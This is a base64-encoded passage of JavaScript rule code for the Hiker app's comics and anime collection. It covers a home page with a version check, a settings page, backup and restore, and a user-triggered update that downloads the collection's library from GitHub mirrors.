biAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzEnXFxufSk7XFxuXFxuaXRlbXMucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdPGg0PuOAkOmYheWKqOa8q/CflK7lj43ppojmlLbpm4bjgJE8L2g0PlxcXCIgKyAnPHNwYW4gc3R5bGU9XFxcImNvbG9yOiBncmV5XFxcIj7lsI/lsI88L3NwYW4+JyxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL21hbmFnZVJ1bGUjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjP3J1bGU96YGT6ZW/5LuT5bqTUHJvXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGx2ZXI6IE1ZX1BBUkFNUy52ZXJzaW9uIHx8IFxcXCLojrflj5bniYjmnKzlpLHotKXvvIzoh6rooYzmn6XnnItcXFwiLFxcbiAgICAgICAgaWQ6IFxcXCI2ODAzXFxcIlxcbiAgICB9XFxufSk7XFxuXFxuaWYgKGdldEl0ZW0oXFxcInJlYWRfcG9saWN5XFxcIikgIT09IFxcXCIxXFxcIikge1xcbiAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPHNtYWxsPjxmb250IGNvbG9yPSM4NzFmNzg+5pys6KeE5YiZ5pWw5o2u5p2l5rqQ5LqO572R57uc77yM5aaC5oKo5Zac5qyi77yM6K+35pSv5oyB5a6Y5pa5PC9mb250Pjwvc21hbGw+JyxcXG4gICAgICAgIGRlc2M6ICfigJzigJzigJ3igJ08c21hbGw+PGZvbnQgY29sb3I9I2YyMGMwMD7mnKzop4TliJnku4XpmZDlhY3otLnlrabkuaDkuqTmtYHkvb/nlKjvvIzor7fkuo7lr7zlhaXlkI4yNOWwj+aXtuWGheWIoOmZpO+8jOS7u+S9lee7hOe7h+aIluS4quS6uuS4jeW+l+S7peS7u+S9leaWueW8j+aWueazleS8oOaSreaIluWUruWNluatpOinhOWImeeahOaVtOS9k+aIlumDqOWIhu+8gTwvZm9udD48L3NtYWxsPicsXFxuICAgICAgICB1cmw6ICQoJyNub0hpc3RvcnkjJykubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgIHNldEl0ZW0oXFxcInJlYWRfcG9saWN5XFxcIiwgXFxcIjFcXFwiKVxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/kvaDlt7LlkIzmhI/or6XljY/orq5cXFwiXFxuICAgICAgICB9KSxcXG4gICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXG4gICAgfSlcXG59XFxuXFxuaXRlbXMucHVzaCh7XFxuICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdPGI+5pu05paw5YWs5ZGKPC9iPicsXFxuICAgIHVybDogXFxcImh0dHBzOi8vaW1nLnZpbnVhLmNuL2ltYWdlcy92a24zSi5qcGVnXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiXFxufSk7XFxuXFxubGV0IG5ld1ZlcnNpb247XFxubGV0IG15VmVyc2lvbiA9IE1ZX1BBUkFNUy52ZXJzaW9uO1xcbnRyeSB7XFxuICAgIG5ld1ZlcnNpb24gPSBKU09OLnBhcnNlKGZldGNoUEMoXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9kZXYvZ2V0YnlpZD9pZD02NzQ5XFxcIiwge1xcbiAgICAgICAgdGltZW91dDogMTAwMFxcbiAgICB9KSkucmVzdWx0LnZlcjtcXG59IGNhdGNoIChlKSB7XFxuICAgIHRvYXN0KFxcXCLpgZPplb/ku5PlupPmir3po47kuobvvIzmnKzmrKHmnKrmo4DmtYvliLDmlrDniYjkv6Hmga9cXFwiKTtcXG4gICAgbmV3VmVyc2lvbiA9IG15VmVyc2lvbjtcXG59XFxubGV0IGlzVXBkYXRlID0gTnVtYmVyKG5ld1ZlcnNpb24pID4gTnVtYmVyKG15VmVyc2lvbik7XFxubGV0IGlzVmVyID0gTnVtYmVyKG5ld1ZlcnNpb24pID09PSBOdW1iZXIobXlWZXJzaW9uKTtcXG5pZiAoaXNVcGRhdGUpIHtcXG4gICAgbG9nKCfmnInmlrDniYjmnKw6JyArIG5ld1ZlcnNpb24gKyAnLOW9k+WJjTonICsgbXlWZXJzaW9uKTtcXG59XFxuaXRlbXMucHVzaCh7XFxuICAgIHRpdGxlOiBpc1VwZGF0ZSA/IFxcXCLwn4aZ5paw54mI5pysXFxcIiA6IFxcXCLpgZPplb/ku5PlupPlhoXmm7TmlrBcXFwiLFxcbiAgICB1cmw6IGlzVXBkYXRlID8gXFxcIlxcXCIgOiBcXFwiaGlrZXI6Ly9wYWdlL21hbmFnZVJ1bGUjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjP3J1bGU96YGT6ZW/5LuT5bqTUHJvXFxcIixcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgbHZlcjogTVlfUEFSQU1TLnZlcnNpb24gfHwgXFxcIuiOt+WPlueJiOacrOWksei0pe+8jOiHquihjOafpeeci1xcXCIsXFxuICAgICAgICBpZDogXFxcIjY4MDNcXFwiXFxuICAgIH1cXG59KTtcXG5jb25zdCBDb2xvciA9IFxcXCIjMTlCODlEXFxcIjtcXG52YXIgZGVzX2Rlc2MgPSAnPGgxIHN0eWxlPVxcXCJ0ZXh0LWFsaWduOiBjZW50ZXI7XFxcIj7wn5C+5pu05pawWzI0MDEwNl08L2gxPicgK1xcbiAgICAnPDxibG9ja3F1b3RlPjxmb250IGNvbG9yPVxcXCJyZWRcXFwiPGJyPuKRoOaWsOWinueLl+eVqjwvYnI+4pGh5YmU6Zmk5aSx5pWI5rqQ77yM5L+u5aSN6JCM55WqL+i3r+a8q+a8qy/liqjmvKvom4sv5aWH57GzPC9icj48YmxvY2txdW90ZT4nICtcXG5cXG4nPGgxIHN0eWxlPVxcXCJ0ZXh0LWFsaWduOiBjZW50ZXI7XFxcIj7wn5C+5pu05pawWzIzMTAyM108L2gxPicgK1xcbiAgICAnPDxibG9ja3F1b3RlPjxmb250IGNvbG9yPVxcXCJyZWRcXFwiPGJyPuKRoOWbp+asoeWFg++8jOearuearuiZvuWKqOa8q++8jOS4g+iJsuWKqOa8q++8jGdpcmlnaXJp54ix5Yqo5ryr77yMTlTliqjmvKvvvIzmlbTnkIbliIbnsbvvvIzpobXpnaLkvJjljJY8L2JyPuKRoeWinuWKoOabtOaWsOmhtemdoi/lj43ppojpobXpnaLikaLkvJjljJbpmIXliqjmvKvmnKzkvZPvvIzkuI7ml6fop4TliJnkuI3lhbzlrrnvvIzpnIDliKDpmaTlho3lr7zlhaXmm7TmlrDop4TliJk8L2JyPjxibG9ja3F1b3RlPidcXG5cXG5pdGVtcy5wdXNoKHtcXG4gICAgdGl0bGU6ICfmm7TmlrDor6bmg4UgPHNtYWxsPjxzbWFsbD48c3BhbiBzdHlsZT1cXFwiY29sb3I6IzE5Qjg5RFxcXCI+5bGV5byAPjwvc3Bhbj48L3NtYWxsPjwvc21hbGw+JyxcXG4gICAgaW1nOiBcXFwiaHR0cHM6Ly9sYW5tZWlndW9qaWFuZy5jb20vdHViaWFvL21vcmUvMTk3LnBuZ1xcXCIsXFxuICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoamppZCwgZGVjaWQsIGRlc19kZXNjKSA9PiB7XFxuICAgICAgICBpZiAoZ2V0TXlWYXIoXFxcImpqc1xcXCIsIFxcXCLmlLbotbdcXFwiKSA9PSBcXFwi5pS26LW3XFxcIikge1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCJqanNcXFwiLCBcXFwi5bGV5byAXFxcIik7XFxuXFxuICAgICAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBpZDogamppZFxcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+abtOaWsOivpuaDhSA8c21hbGw+PHNtYWxsPjxzcGFuIHN0eWxlPVxcXCJjb2xvcjojMTlCODlEXFxcIj7mlLbotbc+PC9zcGFuPjwvc21hbGw+PC9zbWFsbD4nXFxuICAgICAgICAgICAgfSlcXG5cXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIHRleHRTaXplOiAxNCxcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVTcGFjaW5nOiAzLFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGRlY2lkXFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIHRpdGxlOiAnPHNwYW4gc3R5bGU9XFxcImNvbG9yOiM4MDgwODBcXFwiPicgKyBkZXNfZGVzYyArICc8L3NwYW4+J1xcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFwiampzXFxcIiwgXFxcIuaUtui1t1xcXCIpO1xcblxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGpqaWRcXG4gICAgICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICfmm7TmlrDor6bmg4U8c21hbGw+PHNtYWxsPjxzcGFuIHN0eWxlPVxcXCJjb2xvcjojMTlCODlEXFxcIj7lsZXlvIA+PC9zcGFuPjwvc21hbGw+PC9zbWFsbD4nXFxuICAgICAgICAgICAgfSlcXG5cXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIHRleHRTaXplOiAxNCxcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVTcGFjaW5nOiAzLFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGRlY2lkXFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIHRpdGxlOiAnPHNwYW4gc3R5bGU9XFxcImNvbG9yOiM4MDgwODBcXFwiPicgKyBkZXNfZGVzYy5zdWJzdHIoMCwgMTUwKVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfVxcblxcbiAgICB9LCBNWV9SVUxFICsgXFxcIl9qamlkXFxcIiwgTVlfUlVMRSArIFxcXCJfZGVjaWRcXFwiLCBkZXNfZGVzYyksXFxuICAgIGNvbF90eXBlOiBcXFwiYXZhdGFyXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGlkOiBNWV9SVUxFICsgXFxcIl9qamlkXFxcIlxcbiAgICB9XFxufSk7XFxuXFxuaXRlbXMucHVzaCh7XFxuICAgIHRpdGxlOiAnPHNwYW4gc3R5bGU9XFxcImNvbG9yOiM4MDgwODBcXFwiPicgKyBkZXNfZGVzYy5zdWJzdHIoMCwgMTUwKSxcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdGV4dFNpemU6IDE0LFxcbiAgICAgICAgbGluZVNwYWNpbmc6IDMsXFxuICAgICAgICBpZDogTVlfUlVMRSArIFxcXCJfZGVjaWRcXFwiXFxuICAgIH1cXG59KTtcXG5cXG5yZXMuZGF0YSA9IGl0ZW1zO1xcbnNldEhvbWVSZXN1bHQocmVzKTtcIn0se1wiY29sX3R5cGVcIjpcImljb25fMl9yb3VuZFwiLFwibmFtZVwiOlwi6K6+572uXCIsXCJwYXRoXCI6XCJDb25maWdcIixcInJ1bGVcIjpcImpzOlxcbmFkZExpc3RlbmVyKCdvbkNsb3NlJywgJ2NsZWFyTXlWYXIoXFxcInNvcnRGbGFnXFxcIik7cmVmcmVzaFBhZ2UoKScpXFxuc2V0UGFnZVRpdGxlKCfimpkg6ZiF5Yqo5ryr8J+Uruiuvue9riDimpknKVxcbmNvbnN0IFFJTkdfVElUTEUgPSBnZXRNeVZhcignbXlDb2xsZWN0aW9uJyksXFxuICAgIHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKVxcbmxldCBkYXRhID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRSwgdHJ1ZSksXFxuICAgIGVsID0gW3tcXG4gICAgICAgIHRpdGxlOiAnPGI+IOa4hemZpOe8k+WtmO+8jOeri+WNs+abtOaWsCA8c21hbGw+IO+8iOWfuuS6jui/nOeoi+S7k+W6k++8jOayoeS6i+WIq+eCue+8jOWPr+avj+aciOeCueS4gOasoeabtOaWsO+8iScsXFxuICAgICAgICB1cmw6ICQoXFxcIua4hemZpOe8k+WtmO+8jOeri+WNs+abtOaWsFxcXCIpLmNvbmZpcm0oKHVybCkgPT4ge1xcbiAgICAgICAgICAgIC8v6L+c56iL5L6d6LWW57Si5byV5paH5Lu25Luj55CG5Zyw5Z2A5YiX6KGoXFxuICAgICAgICAgICAgbGV0IHJlcXVpcmVsaXN0ID0gWydodHRwczovL3Jhdy5pcWlxLmlvLycsICdodHRwczovL2dpdGh1Yi5qZXZvbnMudmlwL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCAnaHR0cHM6Ly9naHByb3h5LmNvbS9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vJywgJ2h0dHBzOi8vY2RuLnN0YXRpY2FseS5jb20vZ2gvJywgJ2h0dHBzOi8vZ2l0aHViLmpldm9ucy52aXAvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLyddXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCByZXF1aXJlbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICB0cnkgeyAvL+i/nOeoi+S+nei1lue0ouW8lVxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHJlcyA9IHJlcXVlc3QocmVxdWlyZWxpc3RbaV0gKyAnUVExOTkzSFVBTkcvWU1KL21haW4vJywge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGhTdGF0dXNDb2RlOiB0cnVlXFxuICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgaWYgKEpTT04ucGFyc2UocmVzKS5zdGF0dXNDb2RlID09IDIwMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChmaWxlRXhpc3QodXJsKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVGaWxlKHVybClcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWlyZURvd25sb2FkKHJlcXVpcmVsaXN0W2ldICsgJ1FRMTk5M0hVQU5HL1lNSi9tYWluJyx1cmwpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWlyZURvd25sb2FkKHJlcXVpcmVsaXN0W2ldICsgJ1FRMTk5M0hVQU5HL1lNSi9tYWluJyx1cmwpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7fVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICByZWZyZXNoUGFnZSh0cnVlKVxcbiAgICAgICAgICAgIGJhY2soZmFsc2UpXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3suabtOaWsCdcXG4gICAgICAgIH0sIHVybCksXFxuICAgICAgICBpbWc6ICdoaWtlcjovL2ltYWdlcy9pY29uNCcsXFxuICAgICAgICBjb2xfdHlwZTogJ2F2YXRhcidcXG4gICAgfV0sXFxuICAgIHVwZGF0ZUludGVydmFsID0gcmVhZEZpbGUoJ3VwZGF0ZUludGVydmFsJykgfHwgJzEnLFxcbiAgICBuZXdXaW5kb3cgPSByZWFkRmlsZSgnbmV3V2luZG93JyksXFxuICAgIHRhYkZvbGQgPSByZWFkRmlsZSgndGFiRm9sZCcpLFxcbiAgICBkaXNhYmxlQ3VzdG9tID0gcmVhZEZpbGUoJ2Rpc2FibGVDdXN0b20nKSxcXG4gICAgZWRpdE1vZGUgPSBkaXNhYmxlQ3VzdG9tID8gJ+WvvOWFpea1t+mYlCcgOiBnZXRNeVZhcignZWRpdE1vZGUnLCAn5ZCv55SoL+emgeeUqCcpXFxuXFxuZWwucHVzaCh7XFxuICAgIHRpdGxlOiAnICDwn5KhIOabtOaWsOmikeeOhzogJyArICh1cGRhdGVJbnRlcnZhbCA9PSAwID8gJ+aJi+WKqCcgOiB1cGRhdGVJbnRlcnZhbCArICflpKknKSArICcgICcsXFxuICAgIHVybDogJCh1cGRhdGVJbnRlcnZhbCwgJ+i+k+WFpeabtOaWsOmXtOmalO+8iOWkqe+8ie+8jOS4ujDliJnmiYvliqjmm7TmlrBcXFxcbuacrOWcsOaWh+S7tumTvuaOpeaXoOaViCcpLmlucHV0KCgpID0+IHtcXG4gICAgICAgIGlucHV0ID0gcGFyc2VJbnQoaW5wdXQpXFxuICAgICAgICBpZiAoTnVtYmVyLmlzTmFOKGlucHV0KSkgaW5wdXQgPSAxXFxuICAgICAgICBlbHNlIGlmIChpbnB1dCA8IDEpIGlucHV0ID0gMFxcbiAgICAgICAgc2F2ZUZpbGUoJ3VwZGF0ZUludGVydmFsJywgaW5wdXQudG9TdHJpbmcoKSlcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfSksXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG59LCB7XFxuICAgIHRpdGxlOiAnICDwn5alIOeLrOeri+mmlumhtTogJyArIChuZXdXaW5kb3cgPyAn5pivJyA6ICflkKYnKSArICcgICcsXFxuICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgobmV3V2luZG93KSA9PiB7XFxuICAgICAgICBzYXZlRmlsZSgnbmV3V2luZG93JywgbmV3V2luZG93ID8gJycgOiAnVCcpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH0sIG5ld1dpbmRvdyksXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG59LCB7XFxuICAgIHRpdGxlOiAnICDwn5KgIOWIhuexu+aKmOWPoDogJyArICh0YWJGb2xkID8gJ+aYrycgOiAn5ZCmJykgKyAnICAnLFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHRhYkZvbGQpID0+IHtcXG4gICAgICAgIHNhdmVGaWxlKCd0YWJGb2xkJywgdGFiRm9sZCA/ICcnIDogJ1QnKVxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICB9LCB0YWJGb2xkKSxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbn0sIHtcXG4gICAgdGl0bGU6ICcgIPCfkrwg5aSH5Lu95oGi5aSNICAnLFxcbiAgICB1cmw6ICQoWyflpIfku70nLCAn5oGi5aSNJ10sIDEpLnNlbGVjdCgoUUlOR19USVRMRSwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSkgPT4ge1xcbiAgICAgICAgbGV0IHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKVxcbiAgICAgICAgaWYgKCF1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly8nKSAmJiAhdXJsLnN0YXJ0c1dpdGgoJ2ZpbGU6Ly8nKSlcXG4gICAgICAgICAgICB1cmwgPSAnaGlrZXI6Ly9maWxlcy9saWJzLycgKyBtZDUodXJsKSArICcuanMnXFxuICAgICAgICBlbHNlIGlmICh1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly9wYWdlLycpKSB1cmwgPSAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgIGlmIChpbnB1dCA9PSAn5aSH5Lu9JykgcmV0dXJuICQoJ2hpa2VyOi8vZmlsZXMvdG1wLycgKyBRSU5HX1RJVExFICsgJ19iYWNrdXAuanNvbicsICfovpPlhaXlpIfku73ot6/lvoQnKVxcbiAgICAgICAgICAgIC5pbnB1dCgodXJsLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBydWxlcyA9IHJlcXVlc3QodXJsKSxcXG4gICAgICAgICAgICAgICAgICAgIGN1c3RvbURhdGEgPSByZWFkRmlsZSgnY3VzdG9tRGF0YScpXFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShpbnB1dCwgSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSW50ZXJ2YWw6IHVwZGF0ZUludGVydmFsLFxcbiAgICAgICAgICAgICAgICAgICAgbmV3V2luZG93OiBuZXdXaW5kb3csXFxuICAgICAgICAgICAgICAgICAgICB0YWJGb2xkOiB0YWJGb2xkLFxcbiAgICAgICAgICAgICAgICAgICAgZGlzYWJsZUN1c3RvbTogZGlzYWJsZUN1c3RvbSxcXG4gICAgICAgICAgICAgICAgICAgIGN1c3RvbURhdGE6IGN1c3RvbURhdGEsXFxuICAgICAgICAgICAgICAgICAgICBydWxlczogcnVsZXNcXG4gICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7LlpIfku73vvIzms6jmhI/oi6Xku5PlupPkuLrlrZDpobXpnaLliJnkuI3lpIfku70nXFxuICAgICAgICAgICAgfSwgdXJsLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKVxcbiAgICAgICAgZWxzZSByZXR1cm4gJCgnaGlrZXI6Ly9maWxlcy90bXAvJyArIFFJTkdfVElUTEUgKyAnX2JhY2t1cC5qc29uJywgJ+i+k+WFpeWkh+S7vei3r+W+hCcpLmlucHV0KCh1cmwpID0+IHtcXG4gICAgICAgICAgICBsZXQgeyB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tLCBjdXN0b21EYXRhLCBydWxlcyB9ID0gSlNPTi5wYXJzZShyZXF1ZXN0KGlucHV0KSlcXG4gICAgICAgICAgICBzYXZlRmlsZSgndXBkYXRlSW50ZXJ2YWwnLCB1cGRhdGVJbnRlcnZhbClcXG4gICAgICAgICAgICBzYXZlRmlsZSgnbmV3V2luZG93JywgbmV3V2luZG93KVxcbiAgICAgICAgICAgIHNhdmVGaWxlKCd0YWJGb2xkJywgdGFiRm9sZClcXG4gICAgICAgICAgICBzYXZlRmlsZSgnZGlzYWJsZUN1c3RvbScsIGRpc2FibGVDdXN0b20pXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ2N1c3RvbURhdGEnLCBjdXN0b21EYXRhKVxcbiAgICAgICAgICAgIGlmIChydWxlcykgd3JpdGVGaWxlKHVybCwgcnVsZXMpXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKVxcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7LmgaLlpI3vvIzlpoLmnpzkuI3mg7PlkIzmraXov5znqIvku5PlupPvvIzlj6/ku6Xorr7nva7mm7TmlrDpopHnjofkuLrmiYvliqgnXFxuICAgICAgICB9LCB1cmwpXFxuICAgIH0sIFFJTkdfVElUTEUsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxufSwge1xcbiAgICB0aXRsZTogJ+KAnOKAnOKAneKAnTxmb250IGNvbG9yPVxcXCIjNjY2NjY2XFxcIj48c21hbGw+54m55Yir6bij6LCi77yM5bCP56iL5bqP5o+Q5L6b6ICF77ya8J+Imu+4j1xcXFxuJ1xcbiAgICAgICAgLypkYXRhLnJlZHVjZSgoc2VsZiwgdikgPT4gdi5hdXRob3IgPyBzZWxmLmNvbmNhdCh2LmF1dGhvci5zcGxpdCgnJicpKSA6IHNlbGYsIFtdKVxcbiAgICAgICAgLmZpbHRlcigodiwgaSwgYXJyKSA9PiB2ICYmIGFyci5pbmRleE9mKHYpID09IGkpLmpvaW4oJ+OAgScpKi8sXFxuICAgIHVybDogJ2hpa2VyOi8vZW1wdHknLFxcbiAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxufSlcXG5lbC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmm7TmlrAm5Y+N6aaIXFxcIixcXG4gICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL1VwI25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHZlcnNpb246IE1ZX1BBUkFNUy52ZXJzaW9uIHx8IFxcXCLojrflj5bniYjmnKzlpLHotKXvvIzoh6rooYzmn6XnnItcXFwiXFxuICAgIH0sXFxuICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCJcXG59KTtcXG5lbC5wdXNoKHsgY29sX3R5cGU6ICdsaW5lJyB9LCB7XFxuICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArICfwn5OdJy5zbWFsbCgpICsgJyZuYnNwIOmYheWKqOa8q/CflK7oh6rlrprkuYkgJm5ic3AnLmJvbGQoKS5mb250Y29sb3IoJyM3NTc1NzUnKSArIChkaXNhYmxlQ3VzdG9tID8gJ+KdjCcgOiAn4q2VJykuc21hbGwoKSxcXG4gICAgdXJsOiAkKFsoZGlzYWJsZUN1c3RvbSA/ICflkK/nlKgnIDogJ+emgeeUqCcpICsgJ+WQiOmbhuiHquWumuS5iScsICfmuIXpmaToh6rlrprkuYnmlbDmja4nLCAn57yW6L6RSlNPTiddLCAxKS5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgc3dpdGNoIChpbnB1dC5zbGljZSgwLCAyKSkge1xcbiAgICAgICAgICAgIGNhc2UgJ+a4hemZpCc6XFxuICAgICAgICAgICAgICAgIGRlbGV0ZUZpbGUoJ2N1c3RvbURhdGEnKVxcbiAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgIGNhc2UgJ+WQr+eUqCc6XFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgJycpXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICAgICAgY2FzZSAn56aB55SoJzpcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2Rpc2FibGVDdXN0b20nLCAnVCcpXFxuICAgICAgICAgICAgICAgIGlucHV0ICs9ICdcXFxcbuWwj+eoi+W6j+WQr+eUqC/npoHnlKjjgIHph43mlrDmjpLluo/nrYnmk43kvZzlnYfkuI3kvJrkvZPnjrDlnKjpppbpobXlsI/nqIvluo/liJfooajkuK0nXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICAgICAgY2FzZSAn57yW6L6RJzpcXG4gICAgICAgICAgICAgICAgbGV0IHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKVxcbiAgICAgICAgICAgICAgICBpZiAoIXVybC5zdGFydHNXaXRoKCdoaWtlcjovL2ZpbGVzLycpICYmICF1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpKVxcbiAgICAgICAgICAgICAgICAgICAgdXJsID0gJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJ1xcbiAgICAgICAgICAgICAgICByZXR1cm4gICdoaWtlcjovL3BhZ2UvaW50ZXJmYWNlI25vUmVmcmVzaCMjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjP3J1bGU9SlNPTue8lui+keWZqCZKc29uPScrYmFzZTY0RW5jb2RlKHVybClcXG4gICAgICAgIH1cXG4gICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKVxcbiAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3sicgKyBpbnB1dFxcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAgZXh0cmE6IHsgbGluZVZpc2libGU6IGZhbHNlIH1cXG59KTsvKlxcbihkaXNhYmxlQ3VzdG9tID8gWyflr7zlhaXmtbfpmJQnXSA6IFsn5ZCv55SoL+emgeeUqCc